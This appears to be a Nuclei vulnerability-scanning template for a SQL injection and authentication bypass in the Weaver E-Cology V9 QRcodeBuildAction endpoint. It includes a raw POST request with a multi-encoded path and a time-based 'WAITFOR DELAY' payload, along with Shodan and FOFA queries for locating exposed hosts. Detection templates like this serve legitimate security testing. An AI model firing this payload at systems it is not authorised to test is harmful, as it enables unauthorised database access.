id: ecology-v9-qrcodebuildaction-sqli

info:
  name: E-cology V9 QRcodeBuildAction - SQL Injection
  author: qwtd
  severity: high
  description: |
    由于泛微E-Cology9 weaver.formmode.servelt.QRcodeBuildAction接口未对用户传入的数据进行严格的校验和过滤，导致攻击者利用多层编码的方式绕过身份认证进行SQL注入。
    sqlmap利用方式: https://blog.csdn.net/qq_41904294/article/details/131666128
  reference:
    - https://github.com/wy876/POC/blob/main/%E6%B3%9B%E5%BE%AEOA/%E6%B3%9B%E5%BE%AEE-Cology9%E5%B9%B3%E5%8F%B0QRcodeBuildAction%E5%AD%98%E5%9C%A8%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E5%AF%BC%E8%87%B4SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
  metadata:
    verified: true
    max-request: 1
    shodan-query: ecology_JSessionid
    fofa-query:  app="泛微-OA（e-cology）"
  tags: 泛微-协同办公OA

variables:
  randint: '{{rand_int(1111, 9999)}}'

http:
  - raw:
      - |
        @timeout: 15s
        POST /weaver/weaver.formmode.servelt.QRcodeBuildAction/login/LoginSSO.%25%36%61%25%37%33%25%37%30 HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36
        Content-Type: application/x-www-form-urlencoded
        Connection: close
        
        modeid={{randint}}+WAITFOR+DELAY+'0%3a0%3a5'

    matchers:
      - type: dsl
        dsl:
          - 'duration>=5'
          - 'contains(set_cookie, "ecology_JSessionid=")'
        condition: and

# digest: 4a0a004730450220706de22bcda877d015e3158b4912359fceab8b5c6888f625675921c48ebf595f022100baf7463de1956ebc43063ae318c3e1e9b4ee0e96dc1652136e8c0b3c68ae1978:922c64590222798bb761d5b6d8e72950
